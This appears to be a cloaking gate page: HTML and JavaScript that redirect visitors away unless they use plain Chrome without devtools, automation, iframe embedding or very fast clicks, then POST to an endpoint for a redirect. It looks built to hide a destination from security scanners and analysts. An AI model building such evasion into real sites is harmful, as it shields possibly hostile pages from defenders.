<!DOCTYPE html>
<html>
<head>
  <title>Please wait</title>
</head>
<body>

<h3>Please waitâ€¦</h3>
<button onclick="go()">Continue</button>

<script>
function block() {
  location.replace("/chala-jaa-bsdk.html");
}

/* Chrome only */
(function () {
  const ua = navigator.userAgent.toLowerCase();

  if (
    navigator.brave ||
    ua.includes("brave") ||
    (navigator.plugins.length === 0 && ua.includes("chrome"))
  ) block();

  const isChrome =
    ua.includes("chrome") &&
    !ua.includes("edg") &&
    !ua.includes("opr") &&
    !ua.includes("vivaldi") &&
    !ua.includes("duckduckgo");

  if (!isChrome) block();
})();

/* iframe */
if (top !== self) block();

/* devtools */
setInterval(() => {
  const t = performance.now();
  debugger;
  if (performance.now() - t > 120) block();
}, 700);

/* bot */
if (navigator.webdriver || !navigator.languages) block();

/* timer */
const s = Date.now();
setTimeout(() => {
  if (Date.now() - s < 3500) block();
  sessionStorage.setItem("ok", "1");
}, 3500);

/* step */
if (sessionStorage.getItem("entered")) {
  if (!sessionStorage.getItem("ok")) block();
} else sessionStorage.setItem("entered", "1");

function go() {
  fetch("/api/go", { method: "POST" })
    .then(r => r.redirected ? location.href = r.url : block())
    .catch(block);
}
</script>

</body>
</html>
